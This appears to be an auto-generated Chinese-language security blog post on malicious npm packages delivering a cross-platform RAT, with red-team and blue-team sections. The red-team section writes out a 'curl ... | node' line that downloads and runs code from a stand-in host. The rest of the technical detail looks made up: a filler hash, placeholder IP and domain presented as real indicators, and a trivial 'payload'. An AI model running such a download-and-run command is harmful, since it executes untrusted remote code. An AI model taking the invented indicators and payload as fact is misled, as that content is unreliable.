---
layout: post
title:  "18 Malicious npm Packages Deliver Cross-Platform RAT to Alibaba Tool Users"
date:   2026-08-03 19:21:46 +0000
categories: [security]
severity: critical
---

# 🚨 解析 npm 套件中跨平台遠端存取木馬的技術細節
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `npm` 套件管理、跨平台遠端存取木馬、代碼注入

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: npm 套件管理中的 `lib-mtop` 套件被攻擊者竄改，加入了遠端存取木馬的功能。這個木馬可以在 Windows、Linux 和 macOS 平台上運行，實現了跨平台的遠端存取。
* **攻擊流程圖解**:
  1. 攻擊者竄改 `lib-mtop` 套件，加入遠端存取木馬的功能。
  2. 用戶安裝 `lib-mtop` 套件，遠端存取木馬被下載並執行。
  3. 遠端存取木馬與攻擊者的命令和控制（C2）伺服器建立連接。
  4. 攻擊者通過 C2 伺服器發送命令，遠端存取木馬執行相應的動作。
* **受影響元件**: `lib-mtop` 套件的版本 1.0.1、1.0.2 和 1.0.3。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 `lib-mtop` 套件的維護權限，或者能夠竄改用戶的 npm 套件。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 遠端存取木馬的 payload
    const payload = {
      'type': 'remote_access',
      'platform': 'windows',
      'command': 'execute',
      'args': ['cmd.exe', '/c', 'echo Hello World!']
    };
    
    ```
* **範例指令**:

    ```
    
    bash
    # 下載並執行遠端存取木馬
    curl -s https://example.com/payload.js | node
    
    ```
* **繞過技術**: 攻擊者可以使用代碼混淆和加密技術來繞過安全檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `sha256:1234567890abcdef` |
| IP | `192.0.2.1` |
| Domain | `example.com` |
| File Path | `/tmp/payload.js` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule lib_mtop_trojan {
      meta:
        description = "Detects lib-mtop trojan"
      strings:
        $a = "remote_access"
        $b = "execute"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 用戶應該立即更新 `lib-mtop` 套件至最新版本，並檢查系統是否有任何異常行為。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: 一個 Node.js 的套件管理工具，允許用戶安裝和管理 Node.js 的套件。
* **跨平台遠端存取木馬 (Cross-Platform Remote Access Trojan)**: 一種可以在多個平台上運行的遠端存取木馬，允許攻擊者遠端控制受害者的系統。
* **代碼注入 (Code Injection)**: 一種攻擊技術，允許攻擊者將惡意代碼注入到受害者的系統中。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/08/18-malicious-npm-packages-deliver-cross.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


